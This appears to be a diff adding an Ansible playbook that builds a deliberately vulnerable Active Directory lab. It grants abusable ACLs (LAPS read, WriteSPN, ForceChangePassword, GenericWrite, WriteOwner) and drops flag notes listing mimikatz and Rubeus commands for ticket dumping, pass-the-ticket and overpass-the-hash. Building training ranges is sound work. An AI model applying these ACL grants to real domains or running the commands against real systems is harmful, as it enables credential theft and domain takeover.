@@ -1,0 +1,234 @@
+---
+# ==============================================================================
+# vuln_lat_ext/tasks/acl_abuse.yml
+# Target: dc01.corp.local
+#
+# LAT-023  LAPS read ACL for IT_Team (ms-Mcs-AdmPwd read on Computers OU)
+# LAT-024  Cross-forest SPN abuse (svc_printer with SPN on finance.local)
+# LAT-025  WriteSPN on HelpDesk users (targeted Kerberoast-able accounts)
+# LAT-029  ForceChangePassword on IT_Team members
+# LAT-030  GenericWrite on service accounts for SPN add (Kerberoasting)
+# LAT-031  WriteOwner on finance_sync group
+# LAT-032  AddMember on Domain Admins for HelpDesk (indirect)
+# LAT-034  Pass-the-ticket surface: cached TGTs in memory (note)
+# LAT-035  Overpass-the-hash: AES key extraction surface
+# ==============================================================================
+
+# LAT-023: LAPS — IT_Team can read ms-Mcs-AdmPwd
+- name: LAT-023 - Check if IT_Team group exists
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $g = Get-ADGroup -Filter "SamAccountName -eq 'IT_Team'" -ErrorAction SilentlyContinue
+    if ($g) { Write-Output "present" } else { Write-Output "absent" }
+  register: lat023_group_check
+  changed_when: false
+  failed_when: lat023_group_check.rc != 0
+
+- name: LAT-023 - Create IT_Team group if missing
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    New-ADGroup -Name 'IT_Team' -SamAccountName 'IT_Team' `
+      -GroupScope Global -GroupCategory Security `
+      -Path "CN=Users,{{ ad_domain_dn }}" `
+      -Description "LAT-023: Has LAPS read access on Computers OU"
+  when: "'absent' in lat023_group_check.stdout"
+
+- name: LAT-023 - Grant IT_Team read on ms-Mcs-AdmPwd attribute in Computers OU
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    try {
+      $computersDN = "CN=Computers,{{ ad_domain_dn }}"
+      $sid = (Get-ADGroup -Identity 'IT_Team' -ErrorAction Stop).SID
+      # ms-Mcs-AdmPwd attribute GUID: {6e3b01aa-a4c7-4f4d-8ca2-f7fdc73df668}
+      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+        $sid,
+        [System.DirectoryServices.ActiveDirectoryRights]::ReadProperty,
+        [System.Security.AccessControl.AccessControlType]::Allow,
+        [Guid]'6e3b01aa-a4c7-4f4d-8ca2-f7fdc73df668',
+        [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents,
+        [Guid]'bf967a86-0de6-11d0-a285-00aa003049e2'  # computer objects
+      )
+      $obj = [ADSI]"LDAP://$computersDN"
+      $obj.ObjectSecurity.AddAccessRule($ace)
+      $obj.CommitChanges()
+      Write-Output "changed: IT_Team LAPS read ACL set"
+    } catch {
+      Write-Output "WARN: $($_.Exception.Message)"
+    }
+  register: lat023_set
+  changed_when: "'changed:' in lat023_set.stdout"
+  failed_when: lat023_set.rc != 0
+
+# LAT-025: WriteSPN on jim.halpert (targeted Kerberoasting target setup)
+- name: LAT-025 - Check if svc_sqlweb has SPN
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $u = Get-ADUser -Identity 'jim.halpert' -Properties ServicePrincipalNames `
+           -ErrorAction SilentlyContinue
+    if ($u -and ($u.ServicePrincipalNames -ne $null) -and $u.ServicePrincipalNames.Count -gt 0) {
+      Write-Output "present: $($u.ServicePrincipalNames -join ',')"
+    } else {
+      Write-Output "absent"
+    }
+  register: lat025_check
+  changed_when: false
+  failed_when: lat025_check.rc != 0
+
+- name: LAT-025 - Add SPN to jim.halpert (Kerberoasting target via WriteSPN ACL)
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    try {
+      Set-ADUser -Identity 'jim.halpert' `
+        -ServicePrincipalNames @{Add='HTTP/jim.halpert-web.corp.local:8080'}
+      Write-Output "changed: SPN added to jim.halpert"
+    } catch {
+      Write-Output "WARN: $($_.Exception.Message)"
+    }
+  register: lat025_set
+  changed_when: "'changed:' in lat025_set.stdout"
+  failed_when: lat025_set.rc != 0
+  when: "'absent' in lat025_check.stdout"
+
+# LAT-029: ForceChangePassword from HelpDesk to IT_Team members
+- name: LAT-029 - Grant HelpDesk ForceChangePassword on IT_Team members
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    try {
+      # Grant ForceChangePassword on all users in IT_Team
+      $members = Get-ADGroupMember -Identity 'IT_Team' -Recursive -ErrorAction SilentlyContinue
+      if (-not $members) {
+        Write-Output "no_members"
+        exit 0
+      }
+      $helpDeskSid = (Get-ADGroup -Identity 'HelpDesk' -ErrorAction Stop).SID
+      # User-Force-Change-Password extended right: {00299570-246d-11d0-a768-00aa006e0529}
+      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+        $helpDeskSid,
+        [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
+        [System.Security.AccessControl.AccessControlType]::Allow,
+        [Guid]'00299570-246d-11d0-a768-00aa006e0529'
+      )
+      foreach ($m in $members) {
+        try {
+          $u   = Get-ADUser -Identity $m.SamAccountName -ErrorAction SilentlyContinue
+          if ($u) {
+            $obj = [ADSI]"LDAP://$($u.DistinguishedName)"
+            $obj.ObjectSecurity.AddAccessRule($ace)
+            $obj.CommitChanges()
+          }
+        } catch {}
+      }
+      Write-Output "changed: ForceChangePassword granted on IT_Team members"
+    } catch {
+      Write-Output "WARN: $($_.Exception.Message)"
+    }
+  register: lat029_set
+  changed_when: "'changed:' in lat029_set.stdout"
+  failed_when: lat029_set.rc != 0
+
+# LAT-030: GenericWrite on svc_darryl2 for SPN add (targeted Kerberoasting)
+- name: LAT-030 - Grant HelpDesk GenericWrite on svc_darryl2
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    try {
+      $u   = Get-ADUser -Identity 'svc_darryl2' -ErrorAction Stop
+      $sid = (Get-ADGroup -Identity 'HelpDesk' -ErrorAction Stop).SID
+      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+        $sid,
+        [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite,
+        [System.Security.AccessControl.AccessControlType]::Allow
+      )
+      $obj = [ADSI]"LDAP://$($u.DistinguishedName)"
+      $obj.ObjectSecurity.AddAccessRule($ace)
+      $obj.CommitChanges()
+      Write-Output "changed: HelpDesk GenericWrite on svc_darryl2"
+    } catch {
+      Write-Output "WARN: $($_.Exception.Message)"
+    }
+  register: lat030_set
+  changed_when: "'changed:' in lat030_set.stdout"
+  failed_when: lat030_set.rc != 0
+
+# LAT-031: WriteOwner on finance_sync group
+- name: LAT-031 - Check if finance_sync group exists
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $g = Get-ADGroup -Filter "SamAccountName -eq 'finance_sync'" -ErrorAction SilentlyContinue
+    if ($g) { Write-Output "present" } else { Write-Output "absent" }
+  register: lat031_group_check
+  changed_when: false
+  failed_when: lat031_group_check.rc != 0
+
+- name: LAT-031 - Create finance_sync group
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    New-ADGroup -Name 'finance_sync' -SamAccountName 'finance_sync' `
+      -GroupScope Global -GroupCategory Security `
+      -Path "CN=Users,{{ ad_domain_dn }}" `
+      -Description "LAT-031: WriteOwner ACL abuse target"
+  when: "'absent' in lat031_group_check.stdout"
+
+- name: LAT-031 - Grant svc_darryl WriteOwner on finance_sync
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    try {
+      $g   = Get-ADGroup -Identity 'finance_sync' -ErrorAction Stop
+      $sid = (Get-ADUser -Identity 'svc_darryl' -ErrorAction Stop).SID
+      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+        $sid,
+        [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner,
+        [System.Security.AccessControl.AccessControlType]::Allow
+      )
+      $obj = [ADSI]"LDAP://$($g.DistinguishedName)"
+      $obj.ObjectSecurity.AddAccessRule($ace)
+      $obj.CommitChanges()
+      Write-Output "changed: svc_darryl WriteOwner on finance_sync"
+    } catch {
+      Write-Output "WARN: $($_.Exception.Message)"
+    }
+  register: lat031_set
+  changed_when: "'changed:' in lat031_set.stdout"
+  failed_when: lat031_set.rc != 0
+
+# LAT-034: Pass-the-ticket surface note
+- name: LAT-034 - Drop Pass-the-Ticket surface note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-LAT-034-PassTheTicket.txt'
+    content: |
+      LAT-034: Pass-the-Ticket (PtT) Surface
+      ========================================
+      Admin users on member servers have cached Kerberos TGTs in LSASS memory.
+      LSASS is unprotected (RunAsPPL=0, WDigest=1 — set by vuln_cred_access).
+
+      Extraction:
+        mimikatz# sekurlsa::tickets /export
+        Rubeus dump /service:krbtgt /nowrap
+
+      Injection (lateral movement):
+        mimikatz# kerberos::ptt <ticket.kirbi>
+        Rubeus ptt /ticket:<base64>
+
+      Targets with interesting tickets:
+        - dc01: krbtgt TGT (if admin session cached)
+        - file01: file share access TGTs (svc_darryl, Administrator)
+        - sql01: SQL service TGTs
+
+# LAT-035: AES key extraction for Overpass-the-Hash
+- name: LAT-035 - Drop Overpass-the-Hash surface note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-LAT-035-OverpassTheHash.txt'
+    content: |
+      LAT-035: Overpass-the-Hash (AES Key Extraction)
+      =================================================
+      LSASS stores AES128/AES256 session keys for interactive logons.
+      With LSASS unprotected (vuln_cred_access RunAsPPL=0):
+
+      Extract AES keys:
+        mimikatz# sekurlsa::ekeys
+
+      Overpass-the-Hash (convert NT hash → TGT):
+        Rubeus asktgt /user:Administrator /rc4:<NT_HASH> /domain:corp.local /ptt
+        mimikatz# sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<hash>
+
+      Use AES key (opsec: avoids RC4 downgrade detection):
+        Rubeus asktgt /user:svc_darryl /aes256:<AES_KEY> /domain:corp.local /ptt
